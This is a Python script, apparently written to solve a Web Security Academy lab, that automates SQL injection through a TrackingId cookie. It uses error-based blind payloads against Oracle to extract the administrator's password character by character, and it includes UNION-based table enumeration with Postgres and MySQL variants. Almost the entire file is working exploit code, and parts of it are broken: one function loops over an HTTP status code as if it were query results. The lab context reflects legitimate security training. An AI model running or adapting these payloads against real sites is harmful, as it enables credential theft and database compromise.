#!/usr/bin/env python3
import time
import sys
import re
import requests 
import signal

# Global vars 
host= 'acee1fd11fab8f2b80109ded003f00b7.web-security-academy.net' 
url = 'https://{0}/filter'.format(host)


# Function Ctrl+C
def signal_handler(sig, frame):
    print('\n[!] Saliendo ... ')
    sys.exit(1)
signal.signal(signal.SIGINT, signal_handler)

def sqli_requests(sqli):
    try: 

        header = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
        
        payload = {'category': 'Gifts'}

        cookie = {'TrackingId': sqli}
        
        r = requests.get(url, params=payload, headers=header, cookies=cookie)
        #print(r.url) 
#        return (r.text)
        #print(r.status_code)
        return r.status_code
    except: 
        #print(r.url)
        print("Unexpected error:", sys.exc_info()[0])
        print ("Web content: ")
    return r.status_code

def enum_tables(db_name):
    name = '../info/tables/ORACLE_db_tables_{0}.txt'.format(db_name)

    tables = open(name,'w')
    #ORACLE 
    info_table = sqli_requests('\'UNION SELECT column_name,NULL FROM ALL_TAB_COLUMNS where table_name=\'{0}\'-- -'.format(db_name))
    #Postgres
#    info_table = sqli_requests('\'UNION SELECT column_name,NULL FROM information_schema.columns where table_name=\'{0}\'-- -'.format(db_name))
    
    extract_info = sqli_requests('\'UNION SELECT * from {0}-- -'.format(db_name)) 
    if extract_info != 'Internal Server Error':
        for i in range(0,len(extract_info),2):
            user = extract_info[i]
            passwd = extract_info[i+1]
            tables.write("{0} : {1}\n".format(user,passwd))
    tables.close()
    return info_table

def blind_sqli():
    char = 1
#    words_true = '\' OR TRUE -- -'
    error_code = '\'UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual-- -'
    lenght_true = sqli_requests(error_code)
    password = ''

    blacklist = ['\'','\\','%',';']
   
    while True: 
        count=0
        for i in range(32,127): # Codigo ascii 
            if chr(i) not in blacklist:
                subst= 'username=\'administrator\'and SUBSTR(password, {0}, 1)=\'{1}\''.format(char,chr(i))
                sentence = '\'UNION SELECT CASE WHEN ({0}) THEN to_char(1/0) ELSE NULL END FROM users-- -'.format(subst)
#mysql
#                sentence = '\'UNION SELECT NULL from users where username = \'administrator\' and SUBSTRING(password, {0},1) = \'{1}\'-- -'.format(char,chr(i))
                #print(sentence)
                lenght = sqli_requests(sentence)
                if lenght == lenght_true:
                    password+= chr(i)
                    break
                else: 
                    count+=1
            else: 
                 count+=1
        print(password) 
        if count >= (127-32):
            break
        
        char+=1
    print (password) 

def main():

    while True:
        option = input('[ manual (default) | blind (emumeration databases) ] Option: ')
        if option != 'exit': 
            sqli=input("SQLI: ")
            data = sqli_requests(sqli)
            if option == 'blind':
                data = blind_sqli()
                print(data)
            else:
                print(data)
        else:
            sys.exit(0)

if __name__ == "__main__":
    main()
